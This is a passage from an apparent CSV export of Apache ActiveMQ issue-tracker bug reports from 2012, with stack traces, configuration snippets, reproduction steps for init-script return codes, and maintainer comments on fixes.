The completion of the send transaction does a dispatch with the new messages already in the store. An activate does a dispatch from the store. The result can be duplicate dispatches to the subs pending list. The problem is the reset of the audit during activation. The audit should suppress the duplicate dispatch.",,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,235670,,,Fri Apr 20 15:43:14 UTC 2012,,,,,,,,,,,"0|i0ahxj:",59178,,,,,,,,,,,,,,,,,,,,,"20/Apr/12 15:43;gtully;fix in http://svn.apache.org/viewvc?rev=1328413&view=rev

issue with sync between durable sub and prefetch subscription and between cursor cache fill contention between interleaved dispatch from a transaction sync and sub activate.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
NullPointerException logged every 30 seconds while attempting to clear expired messages ,AMQ-3804,12550585,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,rajdavies,rajib_rashid,rajib_rashid,11/Apr/12 21:20,16/Apr/12 17:42,14/Jul/23 05:43,16/Apr/12 17:35,5.6.0,,,,,5.6.0,,,Message Store,,,,0,,,,,,,,,"this is a duplicate of AMQ-3677 which was marked resolved. however i am still noticing this issue using the 5.6 snapshot release from apr 11, 2012. in this case activemq server was shutdown by terminating the java process. when the server is started again, following exception is logged every 30 seconds:

{code}
2012-04-11 14:06:53,786 org.apache.activemq.broker.region.Topic[ActiveMQ Broker[ZyrionMessageBus] Scheduler]: (ERROR) (   Topic.java:683) Failed to remove expired Message from the store 
java.lang.NullPointerException
	at org.apache.activemq.store.kahadb.MessageDatabase.removeAckLocation(MessageDatabase.java:2005)
	at org.apache.activemq.store.kahadb.MessageDatabase.updateIndex(MessageDatabase.java:1259)
	at org.apache.activemq.store.kahadb.MessageDatabase$15.execute(MessageDatabase.java:1046)
	at org.apache.kahadb.page.Transaction.execute(Transaction.java:769)
	at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:1044)
	at org.apache.activemq.store.kahadb.MessageDatabase$13.visit(MessageDatabase.java:977)
	at org.apache.activemq.store.kahadb.data.KahaRemoveMessageCommand.visit(KahaRemoveMessageCommand.java:220)
	at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:969)
	at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:881)
	at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:863)
	at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBTopicMessageStore.doAcknowledge(KahaDBStore.java:715)
	at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBTopicMessageStore.acknowledge(KahaDBStore.java:701)
	at org.apache.activemq.store.kahadb.KahaDBTransactionStore.acknowledge(KahaDBTransactionStore.java:519)
	at org.apache.activemq.store.kahadb.KahaDBTransactionStore$2.acknowledge(KahaDBTransactionStore.java:222)
	at org.apache.activemq.broker.region.Topic.acknowledge(Topic.java:489)
	at org.apache.activemq.broker.region.Topic.messageExpired(Topic.java:681)
	at org.apache.activemq.broker.region.Topic.doBrowse(Topic.java:562)
	at org.apache.activemq.broker.region.Topic.access$100(Topic.java:62)
	at org.apache.activemq.broker.region.Topic$6.run(Topic.java:662)
	at org.apache.activemq.thread.SchedulerTimerTask.run(SchedulerTimerTask.java:33)
	at java.util.TimerThread.mainLoop(Unknown Source)
	at java.util.TimerThread.run(Unknown Source)
{code}

here is the server configuration:

{code}
<beans
    xmlns=""http://www.springframework.org/schema/beans""
    xmlns:amq=""http://activemq.apache.org/schema/core""
    xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
    xsi:schemaLocation=""http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.0.xsd
    http://activemq.apache.org/schema/core http://activemq.apache.org/schema/core/activemq-core.xsd"">

  <!-- Allows us to use system properties as variables in this configuration file -->
  <bean class=""org.springframework.beans.factory.config.PropertyPlaceholderConfigurer""/>
  
  <!-- Configure the ActiveMQ broker -->
  <broker
      xmlns=""http://activemq.apache.org/schema/core""
      brokerName=""ZyrionMessageBus"" 
      useJmx=""false""
      dataDirectory=""${activemq.base}/../../utils/spool/jms""
      deleteAllMessagesOnStartup=""false""
      advisorySupport=""false""
      offlineDurableSubscriberTimeout=""7200000""
      offlineDurableSubscriberTaskSchedule=""1800000"">

    [...]

    <!-- Configure message persistence for the broker -->
    <persistenceAdapter>
      <kahaDB directory=""${activemq.base}/../../utils/spool/jms/kahadb"" ignoreMissingJournalfiles=""true"" checkForCorruptJournalFiles=""true"" checksumJournalFiles=""true""/>
    </persistenceAdapter>
{code}

i can provide a copy of the kahadb directory if necessary to duplicate the issue. let me know if you require any additional information. thanks

",Windows XP SP3,rajib_rashid,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Apr/12 17:42;johno;AMQ-3804.patch;https://issues.apache.org/jira/secure/attachment/12522816/AMQ-3804.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,235449,,,Mon Apr 16 17:35:01 UTC 2012,,,,,,,,,,,"0|i0ahxr:",59179,,,,,,,,,,,,,,,,,,,,,"16/Apr/12 17:09;johno;If the stacktrace is fresh this could mean that the stored destination does not have any message references to the given message sequence (returns null) and when we try and unbox the Long we hit an NPE.;;;","16/Apr/12 17:35;rajdavies;I believe Johno is correct in his diagnosis - resolved by SVN revision 1326692;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQWASInitialContextFactory throws ClassCastException in WebSphere 8,AMQ-3803,12549737,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,brent.shikoski,brent.shikoski,05/Apr/12 15:19,13/Apr/12 22:21,14/Jul/23 05:43,13/Apr/12 22:21,5.5.1,,,,,5.6.0,,,,,,,0,,,,,,,,,"WebSphere 8 includes values other than Strings in the Hashtable provided to configure the external initial context factory when setting up a Generic JMS Provider.

The org.apache.activemq.jndi.AcuityActiveMQWASInitialContextFactory class does not anticipate non-string values in the Hashtable and throws a ClassCastException.

Key: osgi.service.jndi.bundleContext (String)
Value: com.ibm.osgi.jndi.fep.GatewayBundleContextProxy",WebSphere 8,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"05/Apr/12 15:20;brent.shikoski;ActiveMQWASInitialContextFactory.java.patch;https://issues.apache.org/jira/secure/attachment/12521510/ActiveMQWASInitialContextFactory.java.patch","05/Apr/12 15:49;brent.shikoski;ActiveMQWASInitialContextFactoryTest.java.patch;https://issues.apache.org/jira/secure/attachment/12521523/ActiveMQWASInitialContextFactoryTest.java.patch",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,234728,,,Fri Apr 13 22:21:50 UTC 2012,,,,,,,Patch Available,,,,"0|i0ahxz:",59180,,,,,,,,,,,,,,,,,,,,,"13/Apr/12 22:21;tabish;Patch applied with thanks. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Job scheduler can lose data on forced kill,AMQ-3801,12549677,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,05/Apr/12 11:35,06/May/13 19:59,14/Jul/23 05:43,05/Apr/12 11:36,5.5.0,,,,,5.6.0,,,,,,,0,,,,,,,,,The page file that keeps the index of jobs to be scheduled is using default write batch size of 1000. That means that index could get into incorrect state when broker is killed (and there's no recovery for this index). Turning off batching (as it's not needed for this low-volume index) will ensure that changes are always persisted immediately. ,,devantor,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3818,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,234668,,,Mon May 06 19:59:15 UTC 2013,,,,,,,,,,,"0|i0ahy7:",59181,,,,,,,,,,,,,,,,,,,,,"05/Apr/12 11:36;dejanb;Fixed with svn revision 1309780;;;","06/May/13 19:59;devantor;I compared release 5.4.2 performance vs 5.6.0. The fix solve the corruption problem at performance cost.


# Write batch disabled
ant producer -Durl=tcp://127.0.0.1:6503 -Ddurable=true -DtimeToLive=86400000 -Dsubject=DELAY_TEST -Dtransacted=false -DparallelThreads=10 -DmessageSize=10000 -Dmax=1000
BUILD SUCCESSFUL
Total time: 36 minutes 17 seconds


# Batch enabled
     [java] All threads completed their work
BUILD SUCCESSFUL
Total time: 14 seconds;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
org.apache.activemq.util.StringArrayEditor causes classloader leaks,AMQ-3797,12549282,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,davsclaus,mate,mate,03/Apr/12 07:18,03/Sep/12 08:37,14/Jul/23 05:43,03/Sep/12 08:37,5.4.3,,,,,5.7.0,,,,,,,1,,,,,,,,,"A static block in org.apache.activemq.util.IntrospectionSupport registers org.apache.activemq.util.StringArrayEditor with java.beans.PropertyEditorManager. In a web application environment, this will cause classloader leaks, since java.beans.PropertyEditorManager keeps a strong reference to the editor class.

ActiveMQ should at least provide a graceful means of deregistering org.apache.activemq.util.StringArrayEditor (by calling java.beans.PropertyEditorManager.registerEditor() again with editor class null).",,davsclaus,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3959,,,,,,,,,,,,,,,,,,,,,AMQ-4011,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,234273,,,Mon Sep 03 08:37:15 UTC 2012,,,,,,,,,,,"0|i0agon:",58976,,,,,,,,,,,,,,,,,,,,,"30/Aug/12 13:31;davsclaus;Yeah we hit an issue with AMQ reqistering a javax.jms.Destination property editor that played tricks. IMHO property editors in the JDK should not be used, as they are per JVM, and you can override each others editors etc.;;;","01/Sep/12 13:10;davsclaus;The issue would be if people run with multiple AMQ brokers in the same JVM, and hot deploy or uninstall a single broker. Then this would affect existing running brokers as the property editor becomes uninstalled.

In the comment before we hit an issue in the past in Camel, so we no longer use property editors, and they are neither thread safe to use anyway.;;;","01/Sep/12 13:18;davsclaus;AMQ-4011 should fix this problem;;;","02/Sep/12 13:49;davsclaus;Improved the logic to avoid adding the same search paths yet again if AcitveMQ is redeployed.;;;","03/Sep/12 08:37;davsclaus;Okay I have refactored the code to not use StringArrayEditor as a JDK property editor, and thus we dont enlist it to the property editor manager. Which then should fix the leak.
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQ standalone script not fully LSB compliant,AMQ-3795,12549142,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,andreas.krause,andreas.krause,02/Apr/12 10:44,12/Aug/15 17:03,14/Jul/23 05:43,12/Aug/15 17:03,5.4.3,5.5.1,,,,5.12.0,,,,,,,0,LSB,,,,,,,,"Just like in AMQ-3050, I tried to integrate ActiveMQ into a pacemaker setup.

As supposed to work, pacemaker should recognize a frozen or dead process an restart the service. For ActiveMQ 5.4.3 and 5.5.1 this does not work in the following two scenarios:


(1) PID file present, JRE process crashed

Pacemaker recognizes this correctly (status gives return code 1) and calls ""stop"" to give the script the chance to deal with the situation (remove stale PID file e.g.). Since this is done successfully it should give a return code of 0, actually it is 1. A return code of 1 tells pacemaker something went wrong when stopping the service, so it changes the state of the resource to ""unmanaged (FAILED)"" leaving the service in down state.


(2) PID file present, JRE process present, but frozen for some reason

First, pacemaker doesn't recognize this (""status"" gives return code 0 = running, should be non-zero), so maybe ""status"" should connect to the JRE and try talk to ActiveMQ in some way instead of just looking for a process?

Furthermore, if called with ""stop"" in this case (simulated by sending SIGSTOP to the process), the script tries to connect to the JRE to stop it, fails to do so and finally kills the process forcefully. Since it (in some way) successfully stopped the service, it should return 0, but actually it's 1 as well.


Return values needed for LSB compliance are given here: http://refspecs.linuxbase.org/LSB_3.1.0/LSB-Core-generic/LSB-Core-generic/iniscrptact.html",,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-2170,,,AMQ-3831,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,234133,,,Wed Aug 12 17:03:17 UTC 2015,,,,,,,,,,,"0|i0ead3:",81441,,,,,,,,,,,,,,,,,,,,,"02/Apr/12 10:46;andreas.krause;What I've done to reproduce these two scenarios:

# Scenario (1)

$ sudo /opt/activemq/bin/activemq status ; echo ""return code: $?""
INFO: Loading '/etc/default/activemq'
INFO: Using java '/usr/java/default/bin/java'
ActiveMQ is running (pid '26711')
return code: 0
$ sudo kill 26711									# process dies (simulated)
$ sudo /opt/activemq/bin/activemq status ; echo ""return code: $?""
INFO: Loading '/etc/default/activemq'
INFO: Using java '/usr/java/default/bin/java'
ActiveMQ not running
return code: 1										# correct
$ sudo /opt/activemq/bin/activemq stop ; echo ""return code: $?""
INFO: Loading '/etc/default/activemq'
INFO: Using java '/usr/java/default/bin/java'
ERROR: No or outdated process id in '/opt/activemq/data/activemq.pid'

INFO: Removing /opt/activemq/data/activemq.pid
return code: 1										# wrong!
$ sudo /opt/activemq/bin/activemq stop ; echo ""return code: $?""
INFO: Loading '/etc/default/activemq'
INFO: Using java '/usr/java/default/bin/java'
ActiveMQ not running
return code: 0										# correct


# Scenario (2)

$ sudo /opt/activemq/bin/activemq status ; echo ""return code: $?""
INFO: Loading '/etc/default/activemq'
INFO: Using java '/usr/java/default/bin/java'
ActiveMQ is running (pid '28852')
return code: 0
$ sudo kill -SIGSTOP 28852								# process freezes (simulated)
$ sudo /opt/activemq/bin/activemq status ; echo ""return code: $?""
INFO: Loading '/etc/default/activemq'
INFO: Using java '/usr/java/default/bin/java'
ActiveMQ is running (pid '28852')
return code: 0										# wrong
$ sudo /opt/activemq/bin/activemq stop ; echo ""return code: $?""
INFO: Loading '/etc/default/activemq'
INFO: Using java '/usr/java/default/bin/java'
INFO: changing to user 'activemq' to invoke java
INFO: Waiting at least 30 seconds for regular process termination of pid '28852' : 
Java Runtime: Sun Microsystems Inc. 1.6.0_30 /usr/java/jdk1.6.0_30/jre
  Heap sizes: current=251264k  free=249951k  max=251264k
    JVM args: -Xms256M -Xmx256M -Dorg.apache.activemq.UseDedicatedTaskRunner=true -Djava.util.logging.config.file=logging.properties -Dactivemq.classpath=/opt/activemq/conf; -Dactivemq.home=/opt/activemq -Dactivemq.base=/opt/activemq
ACTIVEMQ_HOME: /opt/activemq
ACTIVEMQ_BASE: /opt/activemq
Connecting to pid: 28852
.............................
INFO: Regular shutdown not successful,  sending SIGKILL to process with pid '28852'
return code: 1										# wrong
[... Java Stack Trace ...]
$ sudo /opt/activemq/bin/activemq stop ; echo ""return code: $?""
INFO: Loading '/etc/default/activemq'
INFO: Using java '/usr/java/default/bin/java'
ActiveMQ not running
return code: 0										# correct;;;","17/Jul/12 23:02;tabish;seems related;;;","12/Aug/15 17:03;tabish;The scripts have undergone a lot of work since this was reported, this should be fixed now.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
use of the failover transport incorrectly suppresses javax.jms.InvalidClientIDException when clientId is already in use,AMQ-3792,12548749,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,29/Mar/12 22:00,10/Jul/13 07:37,14/Jul/23 05:43,29/Mar/12 22:36,5.5.1,,,,,5.6.0,,,Broker,,,,0,failover,InvalidClientIDException,,,,,,,"Chucking an javax.jms.InvalidClientIDException is currently conditional on the connection not being fault tolerant and not being a network connector which seems incorrect.
In both cases, a duplicate connection is still a duplicate and we should wait till it is cleaned up/disposed.

A failover variant of the test from https://issues.apache.org/jira/browse/AMQ-463 demonstrates.

This change was introduced in http://svn.apache.org/viewvc/activemq/trunk/activemq-core/src/main/java/org/apache/activemq/broker/region/RegionBroker.java?annotate=633800 but it looks like suppression of a duplicate connectionId in TransportConnector is sufficient for the reconnect case.",,wangyin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,233846,,,Thu Mar 29 22:36:20 UTC 2012,,,,,,,,,,,"0|i0agov:",58977,,,,,,,,,,,,,,,,,,,,,"29/Mar/12 22:36;gtully;fixed in http://svn.apache.org/viewvc?rev=1307142&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Flexibility, concurrency, security, and compatibility issues in CachedLDAPAuthorizationMap",AMQ-3791,12548676,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,davaleri,davaleri,29/Mar/12 14:15,30/Jul/12 09:22,14/Jul/23 05:43,07/Jun/12 12:01,,,,,,5.7.0,,,Broker,Documentation,,,0,,,,,,,,,"CachedLDAPAuthorizationMap provides support for dynamic AuthZ policy updates without restarting the broker; however, I think there are several issues with the implementation.

1) The underlying structures for storing and managing AuthZ policy are not concurrent or synchronized.
2) DN manipulation using Strings is error prone and the current implementation is case sensitive.  This case sensitivity leads to issues with AD.
3) For synchronous updates to the AuthZ policy, the temp destination policy is not reset and may retain out-of-date policy entries.

1) Requires examining the usage of these structures and applying the necessary protections.
2) Can be resolved with better String parsing or through applying the changes in AMQ-3770 to CachedLDAPAuthorizationMap as well.
3) Can be resolved by clearing the policy entry before repopulating the policy from LDAP.


There are also several enhancements to the configurability of the implementation that I see:

1) Support user or group membership in the LDAP entry representing a permission on a destination.  Allowing user DNs or group DNs here makes it easier to deal with one-off policies for individual users.
2) Group membership in the LDAP entry representing a permission on a destination should support use of the full DN, not just the value of the member CN.
3) The based DN should be fully customizable and the LDAP entry representing a permission on a destination should support use of an optional prefix for uniqueness.  ""cn=<PREFIX>read,ou=$,...""
4) The name of the GroupPrincipal or UserPrincipal that is created from the policy in LDAP should be flexible.  For instance, allow the group name or user name attribute to be configured.",,dejanb,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3951,,,AMQ-3770,AMQ-3400,AMQ-3845,,,,,,,,,,,"16/Apr/12 21:28;davaleri;AMQ-3791.patch;https://issues.apache.org/jira/secure/attachment/12522864/AMQ-3791.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,233773,,,Thu Jun 07 12:01:23 UTC 2012,,,,,,,Patch Available,,,,"0|i0ahyn:",59183,,,,,,,,,,,,,,,,,,,,,"29/Mar/12 14:18;davaleri;I am working on a patch to this issue that would be backwards compatible with the existing CachedLDAPAuthorizationMap in the trunk; however, I am wondering if the two LDAP based AuthZ implementations should be merged into one more flexible implementation that uses the best of both.;;;","29/Mar/12 14:24;gtully;reducing code duplication is always a goal, so if the same plugin can meet all requirements with a bit more flexibility, go for it. ;;;","29/Mar/12 15:42;dejanb;We just need to make sure that's documented well for people using current plugins and want to upgrade.;;;","16/Apr/12 21:39;davaleri;I attached the first iteration of a patch for the identified issues.

What you get:
1) Added additional defensive measures for synchronous read/write to the underlying data structures backing the authorization map without altering the behavior of the underlying data structures (for example, don't alter an existing structure that returns a live copy of a list)
2) Custom base DNs and search filters for the different permission and destination types (the limited flexibility in the original implementation made integrating with AD or other LDAP servers without similar schemas difficult)
3) Compatibility with AD (no string parsing of DNs)
4) Support for directly including a user in a permission instead of requiring a group (reduces number of groups that need to be created to support fine grained policies)
5) Ability to choose the attribute that identifies a group or individual member of a permission so the map is flexible enough to work with non-default configurations of the LDAP LoginModule.
6) Policy for temp destinations works correctly when using synchronous update mode
7) Added some tests for working with OpenLDAP and also updated the OpenLDAP example LDIFs to work with an out-of-the-box OpenLDAP instance.  These tests are @Ignore at the moment since they require an external LDAP server; however they make gooe examples and are useful for ensuring compatibility in the future.
8) Compatibility with what I am calling ""legacy group mapping"" where the permission group members are simply a CN and not a full DN.
9) Supports sub-tree renames at the destination pattern level if the LDAP server supports them.

What you lose:

1) Push updates against ApacheDS 1.x.  At the moment Apache DS 1.x push updates don't support filters or scope properly.  As such, the push update solution that avoids parsing DNs doesn't work against Apache DS 1.x.  I can revert to using DN parsing for supporting ApacheDS 1.x; however, I will parse them using LdapName and not raw String manipulation.



Feedback welcome.;;;","25/May/12 22:33;tabish;This new patch should look to ensure it resolves this issue as well.;;;","07/Jun/12 12:01;dejanb;Patch applied with svn revision 1347580. Thanks a lot.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Setting java.io.tmp makes problems with some shell commands,AMQ-3789,12548457,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,28/Mar/12 09:08,26/Aug/13 18:35,14/Jul/23 05:43,28/Mar/12 09:14,,,,,,5.6.0,,,,,,,0,,,,,,,,,"The problem is that with setting java.io.tmp we hit JDK bug and are not able to get list of active VMs, which are used in various shell commands (like stop, list, etc.). The easy solution is to set this property only when we start a broker (as we really don't use it in other scenarios).",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4541,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,233554,,,Wed Mar 28 09:14:37 UTC 2012,,,,,,,,,,,"0|i0ahz3:",59185,,,,,,,,,,,,,,,,,,,,,"28/Mar/12 09:14;dejanb;Fixed with svn revision 1306224;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQSslConnectionFactory does not detect ssl request in failover URIs when creating transports,AMQ-3785,12547959,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,jackf,jackf,24/Mar/12 15:46,17/Dec/12 16:11,14/Jul/23 05:43,16/Jul/12 12:13,5.5.0,,,,,5.7.0,,,Transport,,,,0,,,,,,,,,"The createTransport method in ActiveMQSslConnectionFactory delegates to the super class if the URI scheme 
is not ssl. Failover URIs have 'failover' as the URI scheme and so always delegate to the superclass. This causes
ssl connections that need key or trust stores manipulated by code to hang or fail  as the credentials are not available. 

Code from  SVN trunk for ActiveMQSslConnectionFactory shows why

 protected Transport createTransport() throws JMSException {
        // If the given URI is non-ssl, let superclass handle it.
        if (!brokerURL.getScheme().equals(""ssl"")) {
            return super.createTransport();
        }
// !! jackf comment Code below never reached for failover URIs like failover:ssl:... or failover:(tcp:..., ssl...)
// because the URI Scheme is failover, not ssl.
// Therefore connections that need a keyManager or trustManager fail

        try {
            if (keyManager == null || trustManager == null) {
                trustManager = createTrustManager();
                keyManager = createKeyManager();
                // secureRandom can be left as null
            }
            SslTransportFactory sslFactory = new SslTransportFactory();
            SslContext ctx = new SslContext(keyManager, trustManager, secureRandom);
            SslContext.setCurrentSslContext(ctx);
            return sslFactory.doConnect(brokerURL);
        } catch (Exception e) {
            throw JMSExceptionSupport.create(""Could not create Transport. Reason: "" + e, e);
        }
    }
 
(Vague) Solution: 1) need better pattern match than URI scheme to detect requests for ssl connections. 2) A failover URI is  essentially a list of URIs so multiple ssl transport requests may be in the failover list. A first start is to require that the same key and trust stores are used for all failover connections but you may want to consider allowing customized stores for each of the ssl connections.",Looks global from SVN source but I detected with JDK 1.6.0_31 on Redhat Linux client using AMQ 5.5.0,bryce,ccorsi,gtully,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Aug/12 16:38;bryce;ActiveMQFailoverTest.zip;https://issues.apache.org/jira/secure/attachment/12542149/ActiveMQFailoverTest.zip","12/Dec/12 21:52;ccorsi;client.keystore;https://issues.apache.org/jira/secure/attachment/12560649/client.keystore","12/Dec/12 21:52;ccorsi;server.keystore;https://issues.apache.org/jira/secure/attachment/12560650/server.keystore","12/Dec/12 21:52;ccorsi;ssltruststore.patch;https://issues.apache.org/jira/secure/attachment/12560648/ssltruststore.patch",,,,,,,,,,,,,,,,,,4.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,233056,,,Mon Dec 17 16:11:46 UTC 2012,,,,,,,,,,,"0|i0ahzz:",59189,,,,,,,,,,,,,,,,,,,,,"13/Apr/12 22:25;tabish;Should provide unit tests and patch;;;","16/Jul/12 12:13;gtully;fix in http://svn.apache.org/viewvc?rev=1361984&view=rev
the sslfactory was bypassing normal transport factory resolution. fix is to have it use the sslcontext thread local, which is respected by the ssltransport factory.;;;","23/Aug/12 16:34;bryce;I downloaded the ActiveMQ 5.7 snapshot Jars and still had a similar issue. See attached zip file.
;;;","23/Aug/12 16:38;bryce;Here it is. 

The SSL failover fails with a certificate_unknown error using
ActiveMQSslConnectionFactory.setKeyAndTrustManagers

If, however, that line of code is commented out and Thread.setSslContext is used instead it does work.;;;","12/Dec/12 21:52;ccorsi;This patch fixes the original issue that was brought up with here.  

The problem was that the getUrlOrResourceAsStream method would assume that the passed store name was formatted as a url or was available on the classpath.  It does not take into account the possibility that the store was not located in the classpath and that the passed store name was not converted into a url.

This patch fixes this issue. 

Note that the attached stores are copies from the activemq-stomp module.;;;","17/Dec/12 16:11;ccorsi;I have created a new issue, AMQ-4227, to track the bug that I noticed using the test case that was attached to this issue.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
